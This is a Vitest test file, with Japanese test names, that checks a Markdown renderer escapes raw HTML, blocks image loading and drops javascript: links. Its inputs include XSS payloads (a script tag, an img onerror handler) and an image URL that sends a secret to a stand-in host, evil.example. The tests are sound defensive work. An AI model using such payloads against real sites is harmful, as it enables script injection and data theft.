import { describe, expect, it } from 'vitest'

describe('renderMarkdown', () => {
  it('Markdown を HTML にする', () => {
    expect(renderMarkdown('**太字**')).toContain('<strong>太字</strong>')
  })

  it('生の HTML は、要素にせず文字として出す', () => {
    const html = renderMarkdown('<script>alert(1)</script><img src=x onerror="alert(1)"><style>body{}</style>')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('<style')
    expect(html).toContain('&lt;script&gt;')
  })

  it('画像は読み込まない（URL に載せて情報を外へ送らせない）', () => {
    expect(renderMarkdown('![x](https://evil.example/leak?d=secret)')).not.toContain('<img')
  })

  it('javascript: のリンクは作らず、ほかのリンクは新しいタブで開く', () => {
    expect(renderMarkdown('[x](javascript:alert(1))')).not.toContain('href')
    const html = renderMarkdown('[x](https://example.com)')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })
})
